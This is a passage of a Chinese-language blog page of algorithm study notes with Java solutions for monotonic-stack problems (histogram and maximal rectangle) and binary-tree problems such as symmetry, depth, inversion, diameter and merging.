class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = T.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>( !stack.isEmpty() &amp;&amp; T[stack.peek()] &lt;= T[i])&#123;</span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        res[i] = stack.isEmpty() ? <span class="number">0</span> : (stack.peek() - i);</span><br><span class="line">        stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-5-柱状图中最大矩形"><a href="#4-5-柱状图中最大矩形" class="headerlink" title="4.5 柱状图中最大矩形"></a>4.5 柱状图中最大矩形</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(<span class="keyword">int</span>[] heights)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = heights.length;</span><br><span class="line">    <span class="keyword">int</span>[] left = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">int</span>[] right = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    </span><br><span class="line">    Stack&lt;Integer&gt; mono_stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!mono_stack.isEmpty() &amp;&amp; heights[mono_stack.peek()] &gt;= heights[i]) &#123;</span><br><span class="line">            mono_stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        left[i] = (mono_stack.isEmpty() ? -<span class="number">1</span> : mono_stack.peek());</span><br><span class="line">        mono_stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mono_stack.clear();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!mono_stack.isEmpty() &amp;&amp; heights[mono_stack.peek()] &gt;= heights[i]) &#123;</span><br><span class="line">            mono_stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        right[i] = (mono_stack.isEmpty() ? n : mono_stack.peek());</span><br><span class="line">        mono_stack.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        ans = Math.max(ans, (right[i] - left[i] - <span class="number">1</span>) * heights[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-6-最大矩形"><a href="#4-6-最大矩形" class="headerlink" title="4.6 最大矩形"></a>4.6 最大矩形</h2><p>先转化成求柱状图中最大矩形问题。</p><p>我们首先计算出矩阵的每个元素的左边连续 1的数量，使用二维数组$ \textit{left}$ 记录，其中 $\textit{left}[i][j]$ 为矩阵第 i 行第 j 列元素的左边连续 1 的数量。</p><p>具体而言，当考察以 $\textit{matrix}[i][j]$ 为右下角的矩形时，我们枚举满足 $0 \le k \le i$ 的所有可能的 k，此时矩阵的最大宽度就为</p><script type="math/tex; mode=display">\textit{left}[i][j], \textit{left}[i-1][j], \ldots, \textit{left}[k][j]</script><p>的最小值。</p><p>对每一列：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大矩形3.png" alt="最大矩形3" style="zoom: 33%;" /></p><p>转化成了柱状图中最大矩形问题。</p><p>枚举每一列得到答案。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalRectangle</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.length;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] left = <span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//形成柱状图</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    left[i][j] = (j == <span class="number">0</span> ? <span class="number">0</span> : left[i][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123; <span class="comment">// 对于每一列，使用基于柱状图的方法</span></span><br><span class="line">            <span class="keyword">int</span>[] up = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line">            <span class="keyword">int</span>[] down = <span class="keyword">new</span> <span class="keyword">int</span>[m];</span><br><span class="line"></span><br><span class="line">            Deque&lt;Integer&gt; stack = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; left[stack.peek()][j] &gt;= left[i][j]) &#123;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                up[i] = stack.isEmpty() ? -<span class="number">1</span> : stack.peek();</span><br><span class="line">                stack.push(i);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.clear();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; left[stack.peek()][j] &gt;= left[i][j]) &#123;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                down[i] = stack.isEmpty() ? m : stack.peek();</span><br><span class="line">                stack.push(i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> height = down[i] - up[i] - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">int</span> area = height * left[i][j];</span><br><span class="line">                ret = Math.max(ret, area);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-树"><a href="#5-树" class="headerlink" title="5. 树"></a>5. 树</h1><p>普通二叉树解题基本都离不开各种遍历方法，掌握好遍历方法是做好二叉树的关键。</p><p>二叉搜索树的技巧在于利用其自身的特性，如果当前节点会对下面子节点有整体影响，可以通过辅助函数增长参数列表，借助参数传递信息。</p><h2 id="5-1-对称二叉树"><a href="#5-1-对称二叉树" class="headerlink" title="5.1 对称二叉树"></a>5.1 对称二叉树</h2><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//前序遍历</span></span><br><span class="line"><span class="keyword">return</span> root == <span class="keyword">null</span> || recur(root.left,root.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">recur</span><span class="params">(TreeNode left, TreeNode right)</span></span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="keyword">if</span>(left == <span class="keyword">null</span> &amp;&amp; right == <span class="keyword">null</span>)&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left == <span class="keyword">null</span> || right == <span class="keyword">null</span> || left.val != right.val)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> recur(left.left,right.right) &amp;&amp; recur(left.right,right.left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迭代解法：</p><p>二叉树的算法通常与遍历有关，无法使用递归的遍历方法情况下，有层序遍历和非递归的前序中序后序的遍历方法。</p><p>层序遍历借助队列实现，在本题中可以一个正常层序遍历，一个倒序层序遍历（构建原来树的镜像树）进行比较</p><p>实现队列插入时发现不需要判空，jdk文档的说明：</p><blockquote><p><code>Queue</code> 实现通常不允许插入 <code>null</code> 元素，尽管某些实现（如 <a href="https://tool.oschina.net/uploads/apidocs/jdk-zh/java/util/LinkedList.html"><code>LinkedList</code></a>）并不禁止插入 <code>null</code>。即使在允许 null 的实现中，也不应该将 <code>null</code> 插入到 <code>Queue</code> 中，因为 <code>null</code> 也用作 <code>poll</code> 方法的一个特殊返回值，表明队列不包含元素。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;    </span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">          TreeNode tmp1 = queue.poll();</span><br><span class="line">          TreeNode tmp2 = queue.poll();</span><br><span class="line">          <span class="keyword">if</span>(tmp1 == <span class="keyword">null</span> &amp;&amp; tmp2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(tmp1 == <span class="keyword">null</span> || tmp2 == <span class="keyword">null</span> || tmp1.val != tmp2.val)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//不需要判空，因为queue的linkedlist允许null</span></span><br><span class="line">        queue.add(tmp1.left);</span><br><span class="line">        queue.add(tmp2.right);</span><br><span class="line">          </span><br><span class="line">        queue.add(tmp1.right);</span><br><span class="line">        queue.add(tmp2.left);        </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可不可以不借助队列比较，不去构建镜像比较，将每层直接在原树上借助栈比较，这样有下面的问题</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">  / <span class="string">\</span></span><br><span class="line"> <span class="number">2</span>   <span class="number">2</span></span><br><span class="line">  <span class="string">\</span>   <span class="string">\</span></span><br><span class="line">  <span class="number">3</span>    <span class="number">3</span></span><br></pre></td></tr></table></figure><p>所以入栈时对于子节点不全为null的树节点，将其空子节点置为-1方便比较。而且也需要借助队列，空间复杂度没有得到优化。</p><p>既然可以借助层序遍历，那可不可以借助非递归前序遍历</p><p>应该是不可以的，前序遍历的非递归代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.empty()) &#123;</span><br><span class="line">            <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">                results.add(cur.val);</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            <span class="comment">// 转向</span></span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因为题目要判定对称二叉树，递归可以使得左右同步的进行，所以可以比较，而非递归的遍历方式是一步步的将左子树走完再去走右子树。</p><h2 id="5-2-二叉树最大深度"><a href="#5-2-二叉树最大深度" class="headerlink" title="5.2 二叉树最大深度"></a>5.2 二叉树最大深度</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + Math.max(maxDepth(root.left),maxDepth(root.right));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迭代法：</p><p>使用迭代的方法其实就是记录分支里面最深的深度，参考层序遍历时将每层打印的方法，每记录一层加1可以得到二叉树最大深度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = queue.size();i &gt; <span class="number">0</span>;i--)&#123;</span><br><span class="line">                TreeNode tmp = queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(tmp.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(tmp.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(tmp.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(tmp.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-3-翻转二叉树"><a href="#5-3-翻转二叉树" class="headerlink" title="5.3 翻转二叉树"></a>5.3 翻转二叉树</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//递归出口</span></span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode tmp = root.left;</span><br><span class="line">    <span class="comment">//前序遍历将每个节点反转</span></span><br><span class="line">    root.left = invertTree(root.right);</span><br><span class="line">    root.right = invertTree(tmp);</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以层序遍历将每个节点翻转</p><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode tmp = queue.poll();</span><br><span class="line">            TreeNode node = tmp.left;</span><br><span class="line">            tmp.left = tmp.right;</span><br><span class="line">            tmp.right = node;</span><br><span class="line">            <span class="keyword">if</span>(tmp.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(tmp.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(tmp.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-4-二叉树的直径"><a href="#5-4-二叉树的直径" class="headerlink" title="5.4 二叉树的直径"></a>5.4 二叉树的直径</h2><p>实质为求左右子树深度和的最大值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> max;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    maxDepth(root);</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> leftDepth = maxDepth(root.left);</span><br><span class="line">    <span class="keyword">int</span> rightDepth = maxDepth(root.right);</span><br><span class="line">    max = Math.max(max,leftDepth + rightDepth);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + Math.max(leftDepth,rightDepth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-5-合并二叉树"><a href="#5-5-合并二叉树" class="headerlink" title="5.5 合并二叉树"></a>5.5 合并二叉树</h2><p>递归法：</p><p>前序递归的合并每一个子树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(t2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> t1;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode t = <span class="keyword">new</span> TreeNode(t1.val + t2.val);</span><br><span class="line">        t.left = mergeTrees(t1.left,t2.left);</span><br><span class="line">        t.right = mergeTrees(t1.right,t2.right);</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//如果 t1和t2中，只要有一个是null，函数就直接返回</span></span><br><span class="line"><span class="keyword">if</span>(t1==<span class="keyword">null</span> || t2==<span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> t1==<span class="keyword">null</span>? t2 : t1;</span><br><span class="line">&#125;</span><br><span class="line">java.util.LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> java.util.LinkedList&lt;TreeNode&gt;();</span><br><span class="line">queue.add(t1);</span><br><span class="line">queue.add(t2);</span><br><span class="line"><span class="keyword">while</span>(queue.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">TreeNode r1 = queue.remove();</span><br><span class="line">TreeNode r2 = queue.remove();</span><br><span class="line">r1.val += r2.val;</span><br><span class="line"><span class="comment">//如果r1和r2的左子树都不为空，就放到队列中</span></span><br><span class="line"><span class="comment">//如果r1的左子树为空，就把r2的左子树挂到r1的左子树上</span></span><br><span class="line"><span class="keyword">if</span>(r1.left!=<span class="keyword">null</span> &amp;&amp; r2.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">queue.add(r1.left);</span><br><span class="line">queue.add(r2.left);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r1.left==<span class="keyword">null</span>) &#123;</span><br><span class="line">r1.left = r2.left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对于右子树也是一样的</span></span><br><span class="line"><span class="keyword">if</span>(r1.right!=<span class="keyword">null</span> &amp;&amp; r2.right!=<span class="keyword">null</span>) &#123;</span><br><span class="line">queue.add(r1.right);</span><br><span class="line">queue.add(r2.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r1.right==<span class="keyword">null</span>) &#123;</span><br><span class="line">r1.right = r2.right;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> t1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-6-二叉树的中序遍历"><a href="#5-6-二叉树的中序遍历" class="headerlink" title="5.6 二叉树的中序遍历"></a>5.6 二叉树的中序遍历</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; res = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> 